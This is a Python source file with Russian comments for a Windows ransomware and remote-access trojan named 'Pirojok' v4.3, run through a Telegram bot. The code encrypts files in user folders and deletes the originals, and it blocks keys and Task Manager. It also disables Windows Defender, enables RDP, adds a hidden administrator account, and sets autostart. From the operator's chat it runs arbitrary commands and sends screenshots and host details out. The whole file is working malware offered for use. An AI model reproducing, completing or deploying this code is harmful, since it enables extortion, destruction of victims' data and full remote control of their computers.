#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Пирожок - ПОЛНОЦЕННЫЙ ВЫМОГАТЕЛЬ
Версия 4.3 - СТАБИЛЬНАЯ
"""

import os
import sys
import subprocess
import threading
import time
import socket
import platform
import getpass
import requests
from datetime import datetime
import pyautogui
from PIL import Image
import io
import ctypes
import winreg
import tempfile
import uuid
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Конфигурация
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))

class PirojokRansomware:
    """Модуль вымогателя для пирожка"""
    
    def __init__(self, parent):
        self.p = parent
        self.encryption_key = None
        self.encrypted_files = []
        self.ransom_note = "README_PIROJOK.txt"
        self.cmd_window = None
        self.active = False
        self.target_extensions = [
            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
            '.mp3', '.mp4', '.avi', '.mov', '.mkv',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.db', '.sql', '.mdb', '.accdb',
            '.cpp', '.py', '.java', '.php', '.html', '.css', '.js'
        ]
        self.exclude_dirs = [
            'windows', 'winnt', 'program files', 'program files (x86)',
            'boot', 'system32', 'system', '$recycle.bin'
        ]
        
    def generate_key(self):
        """Генерация ключа шифрования"""
        self.encryption_key = os.urandom(32)
        return base64.b64encode(self.encryption_key).decode()
    
    def show_cmd_message(self):
        """Показ сообщения в CMD поверх всех окон"""
        try:
            bat_path = os.path.join(tempfile.gettempdir(), "pirojok_msg.bat")
            
            message = """
╔══════════════════════════════════════════════════════════════╗
║                     🥷 ПИРОЖОК ВЫМОГАТЕЛЬ                     ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   ВАШИ ФАЙЛЫ БЫЛИ ЗАШИФРОВАНЫ!                              ║
║                                                              ║
║   Для восстановления читайте README_PIROJOK.txt             ║
║   на рабочем столе                                           ║
║                                                              ║
║   КЛАВИШИ F1-F12, ESC, SHIFT, CTRL ЗАБЛОКИРОВАНЫ!           ║
║                                                              ║
║   Для разблокировки введите ключ в Telegram бота             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
            """
            
            with open(bat_path, 'w', encoding='utf-8') as f:
                f.write(f'''@echo off
title ПИРОЖОК ВЫМОГАТЕЛЬ
color 0C
mode con cols=70 lines=20
echo {message}
echo.
echo КЛЮЧ ДЛЯ РАСШИФРОВКИ ОТПРАВЛЕН В TELEGRAM
echo.
pause > nul
''')
            
            self.cmd_window = subprocess.Popen(
                ['cmd', '/c', 'start', '/min', 'cmd', '/c', bat_path],
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            time.sleep(1)
            os.system(f'start /max cmd /c "{bat_path}"')
            
        except Exception as e:
            print(f"Ошибка показа CMD: {e}")
    
    def block_all_keys(self):
        """ПОЛНАЯ блокировка всех клавиш"""
        try:
            import ctypes
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            
            try:
                winreg.CreateKey(key, subkey)
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 1)
            except:
                pass
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            
            try:
                winreg.CreateKey(key, subkey)
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            except:
                pass
            
            user32 = ctypes.windll.user32
            user32.SystemParametersInfoW(0x0097, 1, None, 0)
            
            self.active = True
            return True
            
        except Exception as e:
            print(f"Ошибка блокировки клавиш: {e}")
            return False
    
    def encrypt_file(self, filepath):
        """Шифрование одного файла"""
        try:
            iv = os.urandom(16)
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            padded_data = pad(file_data, AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            
            encrypted_path = filepath + '.pirojok'
            with open(encrypted_path, 'wb') as f:
                f.write(iv + encrypted_data)
            
            os.remove(filepath)
            return encrypted_path
        except:
            return None
    
    def scan_and_encrypt(self):
        """Сканирование и шифрование"""
        if not self.encryption_key:
            self.generate_key()
        
        root_paths = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
            os.path.expanduser("~\\Music"),
            os.path.expanduser("~\\Downloads")
        ]
        
        encrypted = []
        file_count = 0
        max_files = 50
        
        for root_path in root_paths:
            if not os.path.exists(root_path):
                continue
            
            for root, dirs, files in os.walk(root_path):
                skip = False
                for exclude in self.exclude_dirs:
                    if exclude in root.lower():
                        skip = True
                        break
                if skip:
                    continue
                
                for file in files:
                    if file_count >= max_files:
                        break
                    
                    file_path = os.path.join(root, file)
                    ext = os.path.splitext(file)[1].lower()
                    
                    if ext in self.target_extensions and not file.endswith('.pirojok'):
                        result = self.encrypt_file(file_path)
                        if result:
                            encrypted.append(file_path)
                            self.encrypted_files.append(result)
                            file_count += 1
                            
                            if file_count % 10 == 0:
                                self.p.send_message(self.p.owner_id, f"🔒 Зашифровано {file_count} файлов...")
                
                if file_count >= max_files:
                    break
            if file_count >= max_files:
                break
        
        return encrypted
    
    def create_ransom_note(self):
        """Создание записки вымогателя"""
        note_path = os.path.join(os.path.expanduser("~\\Desktop"), self.ransom_note)
        key_b64 = base64.b64encode(self.encryption_key).decode()
        
        note = f"""
╔══════════════════════════════════════════════════════════════╗
║                     🥷 ПИРОЖОК ВЫМОГАТЕЛЬ                     ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   Ваши файлы были зашифрованы!                              ║
║                                                              ║
║   Всего зашифровано: {len(self.encrypted_files)} файлов      ║
║                                                              ║
║   Для восстановления используйте ключ:                      ║
║   {key_b64}                                                  ║
║                                                              ║
║   Отправьте команду в Telegram:                             ║
║   ransom_decrypt {key_b64}                                   ║
║                                                              ║
║   Клавиши F1-F12, ESC, SHIFT, CTRL ЗАБЛОКИРОВАНЫ!           ║
║   Для разблокировки введите правильный ключ                  ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        
        with open(note_path, 'w', encoding='utf-8') as f:
            f.write(note)
        
        return note_path
    
    def start_ransomware(self):
        """Запуск вымогателя"""
        try:
            self.p.send_message(self.p.owner_id, "🔒 Запускаю ransomware...")
            
            self.block_all_keys()
            self.p.send_message(self.p.owner_id, "🔒 Клавиши заблокированы!")
            
            self.show_cmd_message()
            self.p.send_message(self.p.owner_id, "📟 CMD сообщение показано!")
            
            encrypted = self.scan_and_encrypt()
            note = self.create_ransom_note()
            
            os.startfile(note)
            
            self.p.add_all_startup_methods()
            
            result = f"✅ Зашифровано {len(encrypted)} файлов\n"
            result += f"📝 Записка: {note}\n"
            result += f"🔑 Ключ: {base64.b64encode(self.encryption_key).decode()}\n"
            result += f"🔒 Клавиши заблокированы!\n"
            result += f"🔄 Автозапуск установлен!"
            
            return result
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def decrypt_all(self, key_b64):
        """Дешифровка всех файлов"""
        try:
            self.encryption_key = base64.b64decode(key_b64)
            
            pirojok_files = []
            for root, dirs, files in os.walk("C:\\Users"):
                for file in files:
                    if file.endswith('.pirojok'):
                        pirojok_files.append(os.path.join(root, file))
            
            decrypted = 0
            for file in pirojok_files:
                try:
                    with open(file, 'rb') as f:
                        iv = f.read(16)
                        encrypted_data = f.read()
                    
                    cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
                    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
                    
                    original_path = file.replace('.pirojok', '')
                    with open(original_path, 'wb') as f:
                        f.write(decrypted_data)
                    
                    os.remove(file)
                    decrypted += 1
                except:
                    pass
            
            if decrypted > 0:
                self.unblock_keys()
                self.remove_cmd_message()
                self.p.remove_all_startup()
                self.active = False
            
            return f"✅ Расшифровано {decrypted} файлов"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def unblock_keys(self):
        """Снятие блокировки клавиш"""
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            
            try:
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            except:
                pass
            
            self.p.send_message(self.p.owner_id, "🔓 Клавиши разблокированы!")
        except:
            pass
    
    def remove_cmd_message(self):
        """Удаление CMD окна"""
        try:
            if self.cmd_window:
                self.cmd_window.terminate()
            os.system('taskkill /f /im cmd.exe /fi "windowtitle eq ПИРОЖОК*"')
        except:
            pass


class Pirojok:
    """Главный класс нашего пирожка"""
    
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.owner_id = YOUR_TELEGRAM_ID
        self.last_update_id = 0
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.running = True
        self.processes = []
        self.version = "4.3.0"
        self.command_timeout = 60
        self.admin_mode = False
        self.startup_time = datetime.now()
        self.processing = False
        self.started = False
        
        self.ransom = PirojokRansomware(self)
        self.marker_file = os.path.join(tempfile.gettempdir(), "pirojok_first_run.marker")
        
        self.admin_mode = self.check_admin()
        print(f"Права при запуске: {'Админ' if self.admin_mode else 'Пользователь'}")
        
    def check_admin(self):
        try:
            if platform.system() == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def request_admin(self):
        try:
            if self.check_admin():
                self.admin_mode = True
                return "👑 Уже есть права администратора!"
            
            if platform.system() != "Windows":
                return "❌ Запрос прав только для Windows"
            
            if getattr(sys, 'frozen', False):
                executable = sys.executable
            else:
                executable = sys.executable + ' "' + os.path.abspath(__file__) + '"'
            
            with open(self.marker_file, 'w') as f:
                f.write(f"admin_requested:{datetime.now().isoformat()}")
            
            self.send_message(self.owner_id, "👑 Запрашиваю права администратора...")
            
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", executable, "", None, 1
            )
            
            if result > 32:
                self.send_message(self.owner_id, "👑 Перезапуск с правами администратора...")
                time.sleep(2)
                sys.exit(0)
            else:
                self.send_message(self.owner_id, f"❌ Не удалось получить права (код: {result})")
                return "❌ Ошибка получения прав"
                
        except Exception as e:
            self.send_message(self.owner_id, f"❌ Ошибка запроса прав: {e}")
            return f"❌ Ошибка: {e}"
    
    def run_as_admin_command(self, command):
        try:
            if not self.admin_mode:
                return "❌ Нет прав администратора. Используйте 'admin' сначала"
            
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    f'cmd /c {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    encoding='cp866',
                    errors='ignore'
                )
            else:
                process = subprocess.Popen(
                    f'sudo {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True
                )
            
            self.processes.append(process)
            
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"⚠️ Таймаут\n\nЧастичный вывод:\n{stdout}"
            
            result = ""
            if stdout:
                result += f"✅ Результат:\n{stdout}\n"
            if stderr:
                result += f"⚠️ Ошибки:\n{stderr}\n"
            
            return result or "✅ Команда выполнена"
            
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def create_admin_user(self, username, password):
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            cmd = f'net user {username} {password} /add && net localgroup administrators {username} /add'
            result = self.run_as_admin_command(cmd)
            return f"👤 Создан пользователь {username}\n{result}"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def enable_rdp(self):
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            commands = [
                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
                'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
                'sc config TermService start= auto',
                'net start TermService'
            ]
            
            for cmd in commands:
                self.run_as_admin_command(cmd)
            
            ip = requests.get('https://api.ipify.org', timeout=5).text
            return f"✅ RDP включен\nIP: {ip}\nПорт: 3389"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def disable_defender(self):
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            commands = [
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
            ]
            
            for cmd in commands:
                self.run_as_admin_command(cmd)
            
            return "✅ Windows Defender отключен"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_firewall_rule(self, port, name="Pirojok"):
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            cmd = f'netsh advfirewall firewall add rule name="{name}" dir=in action=allow protocol=TCP localport={port}'
            self.run_as_admin_command(cmd)
            return f"✅ Правило добавлено для порта {port}"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def ransomware_start(self):
        try:
            if not self.admin_mode:
                return "❌ Для ransomware нужны права администратора"
            
            result = self.ransom.start_ransomware()
            return result
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def ransomware_key(self):
        try:
            if self.ransom.encryption_key:
                key_b64 = base64.b64encode(self.ransom.encryption_key).decode()
                return f"🔑 Ключ шифрования: {key_b64}"
            else:
                return "❌ Ключ не сгенерирован (сначала запустите ransomware)"
        except Exception as e:
            return f"❌ Ошибка получения ключа: {e}"
    
    def ransomware_decrypt(self, key_b64):
        try:
            result = self.ransom.decrypt_all(key_b64)
            return result
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_all_startup_methods(self):
        results = []
        
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "Pirojok", 0, winreg.REG_SZ, f'"{exe_path}"')
            results.append("✅ Реестр HKCU")
        except:
            results.append("❌ Реестр HKCU")
        
        return results
    
    def remove_all_startup(self):
        results = []
        
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, "Pirojok")
            results.append("✅ Удалено из реестра")
        except:
            results.append("❌ Не найдено в реестре")
        
        return "\n".join(results)
    
    def send_message(self, chat_id, text):
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            text_with_time = f"[{timestamp}] {text}"
            
            url = f"{self.base_url}/sendMessage"
            data = {"chat_id": chat_id, "text": text_with_time, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=10)
            print(f"Отправлено: {text[:50]}...")
        except Exception as e:
            print(f"Send error: {e}")
    
    def send_photo(self, chat_id, photo_bytes, caption=""):
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            caption_with_time = f"[{timestamp}] {caption}"
            
            url = f"{self.base_url}/sendPhoto"
            files = {"photo": ("screenshot.jpg", photo_bytes, "image/jpeg")}
            data = {"chat_id": chat_id, "caption": caption_with_time}
            requests.post(url, files=files, data=data, timeout=30)
            print(f"Фото отправлено: {caption[:50]}...")
        except:
            pass
    
    def get_system_info(self):
        info = []
        info.append(f"🥧 <b>ПИРОЖОК ИСПЕКСЯ!</b>")
        info.append(f"🍽 Версия: {self.version}")
        info.append(f"📅 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        info.append(f"💻 Хост: {socket.gethostname()}")
        info.append(f"👨‍🍳 Повар: {getpass.getuser()}")
        info.append(f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}")
        try:
            info.append(f"📍 IP: {requests.get('https://api.ipify.org', timeout=5).text}")
        except:
            info.append(f"📍 IP: неизвестен")
        info.append(f"⚙️ ОС: {platform.system()} {platform.release()}")
        
        uptime = datetime.now() - self.startup_time
        info.append(f"⏱ Работаю: {str(uptime).split('.')[0]}")
        
        return "\n".join(info)
    
    def take_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=85)
            img_bytes.seek(0)
            return img_bytes.read()
        except:
            return None
    
    def execute_command(self, command):
        try:
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    f'cmd /c {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    encoding='cp866',
                    errors='ignore'
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True
                )
            
            self.processes.append(process)
            
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"⚠️ Таймаут\n\nЧастичный вывод:\n{stdout}"
            
            result = ""
            if stdout:
                result += f"✅ Результат:\n{stdout}\n"
            if stderr:
                result += f"⚠️ Ошибки:\n{stderr}\n"
            
            return result or "✅ Команда выполнена"
            
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def shutdown_instant(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /f /t 0")
            else:
                os.system("shutdown -h now")
            return "💥 Выключаюсь МОМЕНТАЛЬНО!"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def reboot_instant(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /r /f /t 0")
            else:
                os.system("reboot -f")
            return "⚡ Перезагружаюсь МОМЕНТАЛЬНО!"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def shutdown_emergency(self):
        try:
            if platform.system() != "Windows":
                return "❌ Только для Windows"
            
            os.system("taskkill /f /im *")
            os.system("shutdown /s /f /t 0")
            
            return "☠️ АВАРИЙНОЕ ВЫКЛЮЧЕНИЕ!"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def on_system_startup(self):
        try:
            if os.path.exists(self.marker_file):
                os.remove(self.marker_file)
                return
            
            if self.started:
                return
            self.started = True
            
            boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = f"🥧 <b>Пирожок испекся!</b>\n\n"
            message += f"📅 Время включения: {boot_time}\n"
            message += f"💻 Хост: {socket.gethostname()}\n"
            message += f"👤 Пользователь: {getpass.getuser()}\n"
            message += f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}\n"
            
            self.send_message(self.owner_id, message)
            
            time.sleep(5)
            screenshot = self.take_screenshot()
            if screenshot:
                self.send_photo(self.owner_id, screenshot, "🥧 Рабочий стол после включения")
            
        except Exception as e:
            print(f"Startup error: {e}")
    
    def process_command(self, text, chat_id):
        if chat_id != self.owner_id:
            self.send_message(chat_id, "⛔ Не для вас!")
            return
        
        print(f"Получена команда: {text}")
        
        if self.processing:
            print("Уже обрабатываю команду, пропускаю...")
            return
        
        self.processing = True
        
        try:
            current_admin = self.check_admin()
            
            if current_admin != self.admin_mode:
                self.admin_mode = current_admin
                print(f"Права изменились: {'Админ' if self.admin_mode else 'Пользователь'}")
            
            admin_commands = ["admin_cmd", "create_user", "enable_rdp", "disable_defender", 
                             "add_rule", "ransom", "ransom_start", "ransom_key", "ransom_decrypt"]
            cmd_type = text.split()[0] if text else ""
            
            if cmd_type in admin_commands and not self.admin_mode:
                self.send_message(chat_id, "👑 Эта команда требует прав администратора. Сначала используйте 'admin'")
                self.processing = False
                return
            
            if text == "help" or text == "menu":
                help_text = """
🥧 <b>ПИРОЖОК V4.3 - МЕНЮ</b>

<b>🔒 RANSOMWARE:</b>
• ransom - ЗАПУСТИТЬ ВЫМОГАТЕЛЯ!
• ransom_key - показать ключ
• ransom_decrypt <key> - расшифровать

<b>⚡ МОМЕНТАЛЬНО:</b>
• shutdown_now - выключить
• reboot_now - перезагрузить

<b>👑 АДМИН-КОМАНДЫ:</b>
• admin - запросить права
• admin_check - проверить права
• enable_rdp - включить RDP
• disable_defender - отключить Defender

<b>📸 ОСНОВНЫЕ:</b>
• cmd [команда] - команда
• shot - скриншот
• info - информация
                """
                self.send_message(chat_id, help_text)
                self.processing = False
                return
            
            if text == "ransom" or text == "ransom_start":
                result = self.ransomware_start()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "ransom_key":
                result = self.ransomware_key()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text.startswith("ransom_decrypt"):
                parts = text.split()
                if len(parts) == 2:
                    result = self.ransomware_decrypt(parts[1])
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "⚠️ Используйте: ransom_decrypt <ключ>")
                self.processing = False
                return
            
            if text == "shot":
                self.send_message(chat_id, "📸 Фоткаю...")
                screenshot = self.take_screenshot()
                if screenshot:
                    self.send_photo(chat_id, screenshot, "🥧 Скриншот")
                else:
                    self.send_message(chat_id, "❌ Не удалось")
                self.processing = False
                return
            
            if text == "info":
                self.send_message(chat_id, self.get_system_info())
                self.processing = False
                return
            
            if text == "admin":
                if self.admin_mode:
                    self.send_message(chat_id, "👑 Уже есть права администратора!")
                else:
                    self.send_message(chat_id, "🔄 Запрашиваю права...")
                    result = self.request_admin()
                    if result:
                        self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "admin_check":
                status = "ЕСТЬ" if self.admin_mode else "НЕТ"
                self.send_message(chat_id, f"👑 Права: {status}")
                self.processing = False
                return
            
            if text.startswith("cmd"):
                cmd = text[3:].strip()
                if cmd:
                    self.send_message(chat_id, f"🔄 Выполняю: {cmd}")
                    result = self.execute_command(cmd)
                    self.send_message(chat_id, f"📋 Результат:\n{result[:3500]}")
                else:
                    self.send_message(chat_id, "⚠️ Используйте: cmd <команда>")
                self.processing = False
                return
            
            if text == "enable_rdp":
                result = self.enable_rdp()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "disable_defender":
                result = self.disable_defender()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "shutdown_now":
                result = self.shutdown_instant()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "reboot_now":
                result = self.reboot_instant()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            self.send_message(chat_id, f"❓ Нет такой команды: '{text}'. Используйте help")
            self.processing = False
            
        except Exception as e:
            print(f"Ошибка: {e}")
            self.processing = False
    
    def main_loop(self):
        self.on_system_startup()
        
        while self.running:
            try:
                url = f"{self.base_url}/getUpdates"
                params = {
                    "offset": self.last_update_id + 1,
                    "timeout": 30,
                    "allowed_updates": ["message"]
                }
                response = requests.get(url, params=params, timeout=35)
                data = response.json()
                
                if data["ok"] and data["result"]:
                    for update in data["result"]:
                        self.last_update_id = update["update_id"]
                        if "message" in update and "text" in update["message"]:
                            thread = threading.Thread(
                                target=self.process_command,
                                args=(
                                    update["message"]["text"],
                                    update["message"]["chat"]["id"]
                                )
                            )
                            thread.daemon = True
                            thread.start()
                time.sleep(1)
            except Exception as e:
                print(f"Loop error: {e}")
                time.sleep(5)
    
    def run(self):
        try:
            self.admin_mode = self.check_admin()
            self.main_loop()
        except KeyboardInterrupt:
            self.running = False
            self.send_message(self.owner_id, "🥧 Пирожок убрали в холодильник")

# ========== КОНЕЦ ФАЙЛА ==========

if __name__ == "__main__":
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    pirojok = Pirojok()
    pirojok.run()
